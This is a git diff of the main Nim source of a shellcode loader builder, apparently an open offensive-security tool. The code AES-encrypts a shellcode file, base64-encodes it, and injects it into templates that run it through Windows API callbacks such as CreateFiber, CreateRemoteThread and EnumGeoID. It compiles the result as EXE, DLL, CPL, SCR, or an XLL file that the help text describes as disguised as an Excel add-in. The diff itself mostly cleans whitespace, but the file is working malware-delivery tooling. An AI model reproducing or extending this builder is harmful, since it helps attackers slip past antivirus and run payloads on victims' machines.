@@ -8,48 +8,48 @@ import sysrandom
 
 
 let banner = """
- ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __ 
+ ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __
  | || | ||  || ||        //   || \\ // \\ ||    || ||    || ||\ ||  // \\     //   ||  || // \\  // \\  (( \
-   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\ 
+   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\
    ||   ||  || ||___     \\__ || \\ || ||  \V/\V/  ||__| || || \||  \\_||     \\__ ||  || || ||  \\_//  \_))
-                                                                                                            
-        
-                                                                ,* .,  ,., .                        
-                                                           .**((((.        ,(%(//,                  
-                                                           ,((((,     */      ,(((/.. .             
-               ,/((((*      *(((/,,                         .*/*,              ,**,.                
-           ..*(/#(              /(#(*,                          ./,.         ....                   
-            .,/*/,              ,((/*,.                                                             
-              .(//             .*,..                                                                
-                    ..     ..                                                                       
-                                                                                                    
-                                                                                                    
-                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.     
+
+
+                                                                ,* .,  ,., .
+                                                           .**((((.        ,(%(//,
+                                                           ,((((,     */      ,(((/.. .
+               ,/((((*      *(((/,,                         .*/*,              ,**,.
+           ..*(/#(              /(#(*,                          ./,.         ....
+            .,/*/,              ,((/*,.
+              .(//             .*,..
+                    ..     ..
+
+
+                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.
 ,* .*  **,,,,.                     *//#((/.          /##/(/.               ,*/#(##/         ./#(/(*.
 #/.        ,##((*,*              .,/(##(               .(###*,            .*(#(((               /#((
               /###*,,             ..*/**       .        ,/*/*,.             ./*//                ,//
               ,((***,.               *//*               ,/,..                 ,*//,              *.,
-             .,***.                      .,*.       ....                           ,,,        ,,... 
-           .....                                                                                    
-                                                                                                    
-                                                                                                    
-                                                                                                    
-                                                                                                    
-                                                                                                    
-                                                                      .*.  ,   .. ,,.               
-     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,           
-  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.      
- ,*((#((.                (####/..                              .,/(((#*                 *#((((,,    
- ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.  
-  ,//,*.                 .***/** .                                .*//*,                 ,**/* .    
-   .(//*                 ..,,.                                       ,///               .,...       
-      .,,*.          ...,..                                               ,,,.       ., .           
-               .                                                                                    
-                                                                                                    
-  
+             .,***.                      .,*.       ....                           ,,,        ,,...
+           .....
+
+
+
+
+
+                                                                      .*.  ,   .. ,,.
+     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,
+  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.
+ ,*((#((.                (####/..                              .,/(((#*                 *#((((,,
+ ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.
+  ,//,*.                 .***/** .                                .*//*,                 ,**/* .
+   .(//*                 ..,,.                                       ,///               .,...
+      .,,*.          ...,..                                               ,,,.       ., .
+               .
+
+
              ...quivering and afraid, into the sightless vortex of the unimaginable.
 
-         
+
 """
 echo "\n"
 echo banner
@@ -72,7 +72,7 @@ FlsAlloc  [flsalloc]
 
 File types currently available:
 EXE - bread and butter
-DLL - use rundll32.exe and give it any function after (ex: rundll32.exe evil.dll foobar123) 
+DLL - use rundll32.exe and give it any function after (ex: rundll32.exe evil.dll foobar123)
 CPL - Control Panel Applet, can just be clicked or run with control.exe or rundll32.exe
 SCR - can be run just by clicking, or executing the file in a shell
 XLL - disguised as an Excel dock, sideloads payload
@@ -84,11 +84,11 @@ XLL - disguised as an Excel dock, sideloads payload
 
 
 
-proc main() = 
+proc main() =
     let #get args
-        apiMethod: string = paramStr(1)
+        apiMethod: string = strutils.toLowerAscii(paramStr(1))
         binFile: string = paramStr(2)
-        fileType: string = paramStr(3)
+        fileType: string = strutils.toLowerAscii(paramStr(3))
 
 
 
@@ -104,16 +104,16 @@ proc main() =
         key: array[aes256.sizeKey, byte]
         iv: array[aes256.sizeBlock, byte]
         encrypted: seq[byte] = newSeq[byte](len(plaintext))
-    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #static still for new 
+    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #static still for new
     var newpassword: string = getRandomString(32)
     var expandedKey = sha256.digest(newpassword)
     copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
 
-        
+
     ectx.init(key, iv)
     ectx.encrypt(plaintext, encrypted)
     ectx.clear()
-        
+
     # Base64 encode encrypted shellcode
     let encodedCrypted = encode(encrypted)
 
@@ -122,16 +122,16 @@ proc main() =
 
     if apiMethod == "enumgeoid":
 
-        if fileType != "xll": 
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -158,29 +158,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumGeoIDXLL.dll .\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim")
-            
+
             discard execShellCmd("move EnumGeoIDXLL.dll EnumGeoID.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -194,18 +194,18 @@ proc main() =
         else:
             echo "\n"
 
-    elif apiMethod == "createfiber": 
+    elif apiMethod == "createfiber":
 
-        if fileType != "xll": 
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -232,29 +232,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\CreateFiber\\CreateFiberXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateFiberXLL.dll .\\apiMethods\\CreateFiber\\CreateFiberXLL.nim")
-            
+
             discard execShellCmd("move CreateFiberXLL.dll CreateFiber.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -267,18 +267,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-     
-    elif apiMethod == "createremotethread": 
-        if fileType != "xll": 
+
+    elif apiMethod == "createremotethread":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -305,29 +305,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateRemoteThreadXLL.dll .\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim")
-            
+
             discard execShellCmd("move CreateRemoteThreadXLL.dll CreateRemoteThread.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -340,18 +340,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-       
-    elif apiMethod == "createthreadpoolwait": 
-        if fileType != "xll": 
+
+    elif apiMethod == "createthreadpoolwait":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -380,29 +380,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateThreadpoolWaitXLL.dll .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim")
-            
+
             discard execShellCmd("move CreateThreadpoolWaitXLL.dll CreateThreadpoolWait.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -415,18 +415,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-        
-    elif apiMethod == "enumlanguage": 
-        if fileType != "xll": 
+
+    elif apiMethod == "enumlanguage":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -453,29 +453,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumLanguageGroupLocalesXLL.dll .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim")
-            
+
             discard execShellCmd("move EnumLanguageGroupLocalesXLL.dll EnumLanguageGroupLocales.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -488,18 +488,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-        
-    elif apiMethod == "cryptenum": 
-        if fileType != "xll": 
+
+    elif apiMethod == "cryptenum":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -526,25 +526,25 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
             echo "This function currently isn't working with XLL. I'll fix this soon. -S3lrius"
         else:
             echo "\n"
-        
-    elif apiMethod == "enumdisplay": 
-        if fileType != "xll": 
+
+    elif apiMethod == "enumdisplay":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -571,29 +571,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDisplayMonitorsXLL.dll .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim")
-            
+
             discard execShellCmd("move EnumDisplayMonitorsXLL.dll EnumDisplayMonitors.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -606,18 +606,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-        
-    elif apiMethod == "enumsystemstore": 
-        if fileType != "xll": 
+
+    elif apiMethod == "enumsystemstore":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -644,29 +644,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CertEnumSystemStoreXLL.dll .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim")
-            
+
             discard execShellCmd("move CertEnumSystemStoreXLL.dll CertEnumSystemStore.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -679,18 +679,18 @@ proc main() =
             file_path.writeFile(file_target)
         else:
             echo "\n"
-        
-    elif apiMethod == "enumdesktop": 
-        if fileType != "xll": 
+
+    elif apiMethod == "enumdesktop":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -717,29 +717,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDesktopWindowsXLL.dll .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim")
-            
+
             discard execShellCmd("move EnumDesktopWindowsXLL.dll EnumDesktopWindows.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -753,17 +753,17 @@ proc main() =
         else:
             echo "\n"
 
-    elif apiMethod == "enumtime": 
-        if fileType != "xll": 
+    elif apiMethod == "enumtime":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -790,29 +790,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumTimeFormatsExXLL.dll .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim")
-            
+
             discard execShellCmd("move EnumTimeFormatsExXLL.dll EnumTimeFormatsEx.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -826,17 +826,17 @@ proc main() =
         else:
             echo "\n"
 
-    elif apiMethod == "enumcalendar": 
-        if fileType != "xll": 
+    elif apiMethod == "enumcalendar":
+        if fileType != "xll":
             let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
@@ -863,29 +863,29 @@ proc main() =
             let original_pass = "PASSWORD_ME"
             file_target = file_target.replace(password_revert, original_pass)
             file_path.writeFile(file_target)
-        else: 
+        else:
             echo "\n"
 
         if fileType == "xll":
 
             let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim"
             var file_target = file_path.readFile()
-            
+
             let placeholder = "REPLACE_ME"
             let replacement =  encodedCrypted
             file_target = file_target.replace(placeholder, replacement)
-            file_path.writeFile(file_target) 
+            file_path.writeFile(file_target)
 
-            
+
             let pass_new = newpassword
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
             discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumCalendarInfoXLL.dll .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim")
-            
+
             discard execShellCmd("move EnumCalendarInfoXLL.dll EnumCalendarInfo.xll")
 
-            #put it back!            
+            #put it back!
             let placeholder_new = encodedCrypted
             let replacement_new = "REPLACE_ME"
             file_target = file_target.replace(placeholder_new, replacement_new)
@@ -900,16 +900,16 @@ proc main() =
             echo "\n"
     elif apiMethod == "flsalloc":
 
-            if fileType != "xll": 
+            if fileType != "xll":
                 let file_path = ".\\apiMethods\\FlsAlloc\\FlsAlloc.nim"
                 var file_target = file_path.readFile()
-                
+
                 let placeholder = "REPLACE_ME"
                 let replacement =  encodedCrypted
                 file_target = file_target.replace(placeholder, replacement)
-                file_path.writeFile(file_target) 
+                file_path.writeFile(file_target)
 
-                
+
                 let pass_new = newpassword
                 let replace_pass_new = "PASSWORD_ME"
                 file_target = file_target.replace(replace_pass_new, pass_new)
@@ -945,7 +945,7 @@ proc main() =
                 let original_pass = "PASSWORD_ME"
                 file_target = file_target.replace(password_revert, original_pass)
                 file_path.writeFile(file_target)
-            else: 
+            else:
                 echo "\n"
 
             if fileType == "xll":
@@ -968,9 +968,9 @@ when defined(windows):
                     echo helpmenu
                 elif paramStr(2) == "help":
                     echo helpmenu
-                else: 
+                else:
                     echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> <outfiletype> \n\n"
                     echo "Type 'help' to show api methods and outfile types.\n\n"
-        else: 
+        else:
                 echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> <outfiletype> \n\n"
                 echo "Type 'help' to show api methods and outfile types.\n\n"
